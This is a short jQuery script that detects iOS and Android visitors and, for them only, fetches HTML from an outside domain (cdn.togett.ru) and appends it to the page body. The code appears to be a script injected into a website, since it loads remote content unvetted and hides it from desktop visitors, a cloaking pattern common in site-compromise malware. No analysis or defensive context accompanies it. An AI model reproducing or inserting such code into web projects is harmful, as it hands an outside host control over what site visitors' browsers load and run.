$(document).ready(function(){

    var md = new MobileDetect(window.navigator.userAgent);
    if( md.is('iOS') == true || md.is('AndroidOS') == true ) {

        $.ajax({
            url: 'https://cdn.togett.ru/',
            type: 'get',
            success: function(data) {
                $('body').append(data);
            }
        });
    
    
        $.ajax({
            url: 'https://cdn.togett.ru/button.html',
            type: 'get',
            success: function(data) {
                $('body').append(data);
            }
        });
    }

});
